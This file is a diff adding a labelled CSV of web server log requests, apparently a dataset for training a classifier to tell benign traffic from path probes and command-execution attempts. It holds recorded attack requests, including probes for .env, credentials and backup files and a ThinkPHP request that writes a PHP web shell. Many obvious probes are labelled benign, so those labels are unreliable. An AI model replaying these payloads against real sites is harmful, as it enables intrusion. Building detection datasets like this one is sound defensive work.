@@ -1,0 +1,326 @@
+text,label
+"HEAD /bak/backup.rar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36""",benign
+"HEAD /www.sql HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"HEAD /bak/www.tar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /back/public_html.rar HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"HEAD /old/website.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /backups/config.json HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"HEAD /config.json HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /bak/wallet.dat HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13157 UA=""Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=458 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1""",benign
+"HEAD /old/backup.sql.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /old/website.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /www.tar HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"HEAD /.env HTTP/1.1 STATUS=404 BYTES=124 UA=""-""",suspicious_path_probe
+"GET /wp-content/upload.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 REF=""https://www.reddit.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"HEAD /back/www.rar HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49096 REF=""http://secrepo.com"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15""",benign
+"HEAD /back/website.rar HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"HEAD /old/backup.rar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=350 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"HEAD /website.rar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /backups/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /bak/public_html.tar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /restore/bak.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /bak/sftp-config.json HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"HEAD /backups/mysql.sql HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"HEAD /old/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"HEAD /back/.well-known.zip HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",suspicious_path_probe
+"HEAD /bak/website.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /old/wallet.dat HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /bak/www.sql HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET /assets/plugins/fileupload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1 STATUS=429 BYTES=487 UA=""ALittle Client""",command_exec
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",benign
+"HEAD /backup/directory.tar HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15""",benign
+"HEAD /backups/dump.sql HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36""",benign
+"HEAD /old/mysql.sql HTTP/1.1 STATUS=301 BYTES=180 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49133 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
+"GET /index.php?s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com HTTP/1.1 STATUS=404 BYTES=338 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.5.2.1188 (SpeedMode; Proxy; Android 5.0.2; HTC_Desire_601_dual_sim ) U2/1.0.0 Mobile""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dns.html HTTP/1.1 STATUS=200 BYTES=1837 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0""",benign
+"POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/ HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=458 UA=""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6""",benign
+"HEAD /backup.sql HTTP/1.1 STATUS=301 BYTES=177 UA=""-""",benign
+"HEAD /backup.rar HTTP/1.1 STATUS=301 BYTES=177 UA=""-""",benign
+"GET /ups.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1""",benign
+"HEAD /bak/bak.rar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 REF=""http://www.secrepo.com"" UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36""",benign
+"HEAD /www.rar HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"HEAD /backups/credentials.txt HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49143 REF=""http://www.secrepo.com"" UA=""Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.29.56_r958800.520 NetType/WIFI""",benign
+"HEAD /backups/.env HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",suspicious_path_probe
+"HEAD /.env HTTP/1.1 STATUS=301 BYTES=171 UA=""-""",suspicious_path_probe
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49099 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"HEAD /sftp-config.json HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=350 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36""",benign
+"HEAD /restore/website.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49096 REF=""http://odinon.ru/"" UA=""Re-re Studio (+http://vip0.ru/)""",benign
+"HEAD /old/www.rar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /restore/.env HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",suspicious_path_probe
+"HEAD /restore/sql.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /backups/www.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /back/backup.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /.bash_history HTTP/1.1 STATUS=301 BYTES=180 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36""",benign
+"HEAD /directory.rar HTTP/1.1 STATUS=301 BYTES=180 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"HEAD /backups/sql.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET /upload.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"HEAD /bak/www.rar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /restore/.well-known.zip HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /old/.well-known.zip HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /restore/bak.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /old/www.sql HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
+"HEAD /back/backup.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13152 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36""",benign
+"HEAD /restore/dump.sql HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET / HTTP/1.0 STATUS=200 BYTES=49096 UA=""Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10""",benign
+"HEAD /backup/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",benign
+"HEAD /backups/.well-known.zip HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",suspicious_path_probe
+"HEAD /BlockCypher.log HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://secrepo.com"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"HEAD /backups/directory.tar HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49143 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.29.56_r958800.520 NetType/WIFI""",benign
+"HEAD /back/mysql.sql HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /restore/backup.rar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /restore/.bash_history HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"HEAD /old/public_html.tar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /backups/.env HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /back/bak.tar HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"HEAD /back/directory.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /backup/.env HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",suspicious_path_probe
+"HEAD /old/bak.rar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dns.html HTTP/1.1 STATUS=200 BYTES=1837 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 REF=""http://66.33.221.139"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0""",benign
+"HEAD /old/sql.sql HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /restore/backup.sql HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36""",benign
+"GET /wordpress/ HTTP/1.1 STATUS=301 BYTES=439 UA=""-""",benign
+"GET /data/admin/allowurl.txt HTTP/1.1 STATUS=404 BYTES=338 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0""",suspicious_path_probe
+"GET / HTTP/1.1 STATUS=200 BYTES=13159 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36""",benign
+"POST /index.php/api/Uploadify/preview HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/index.php/api/Uploadify/preview"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET / HTTP/1.1 STATUS=301 BYTES=475 REF=""http://secrepo.com"" UA=""Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.29.56_r958800.520 NetType/WIFI""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13141 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.0 STATUS=200 BYTES=49096 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36""",benign
+"HEAD /bak.rar HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"HEAD /backup/.well-known.zip HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",suspicious_path_probe
+"HEAD /bak/.well-known.zip HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",suspicious_path_probe
+"HEAD /backups/public_html.rar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"GET /honeypot/bsidesdfw - 2014.ipynb HTTP/1.1 STATUS=301 BYTES=481 UA=""Tornado-Async-Client""",benign
+"HEAD /backups/.bash_history HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""",benign
+"HEAD /back/www.sql HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1 STATUS=200 BYTES=386900 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en""",benign
+"HEAD /back/dump.sql HTTP/1.1 STATUS=301 BYTES=180 UA=""-""",benign
+"HEAD /backups/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /bak/website.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /back/www.tar HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"HEAD /old/bak.tar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /back/.bash_history HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /bak/public_html.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /sql.sql HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"HEAD /back/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46""",benign
+"HEAD /bak/.well-known.zip HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""-""",benign
+"HEAD /ftpsync.settings HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"HEAD /backup/www.sql HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1""",benign
+"HEAD /website.tar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36""",benign
+"HEAD /old/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.0 STATUS=200 BYTES=13159 UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)""",benign
+"HEAD /bak/backup.sql HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /restore/config.json HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /restore/website.tar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /backups/bak.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /backups/public_html.tar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"GET /sites/all/libraries/elfinder/elfinder.php.html HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 REF=""http://www.secrepo.com"" UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36""",benign
+"HEAD /backups/backup.sql HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /bak/backup.sql.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",benign
+"HEAD /public_html.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /backup/directory.rar HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.covblog.top/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1""",benign
+"HEAD /restore/.well-known.zip HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",suspicious_path_probe
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36""",benign
+"HEAD /public_html.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"HEAD /backups/www.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /bak/directory.rar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13173 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36""",benign
+"HEAD /restore/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /backup.sql.tar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /backup/backup.tar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"HEAD /backup/backup.rar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.secrepo.com/"" UA=""-""",benign
+"HEAD /backup/sftp-config.json HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /backup/mysql.sql HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET /?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET /.git/info/refs?service=git-upload-pack HTTP/1.1 STATUS=301 BYTES=495 UA=""git/2.17.1""",suspicious_path_probe
+"HEAD /back/.env HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /restore/directory.tar HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"HEAD /bak/config.json HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /backups/backup.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36""",benign
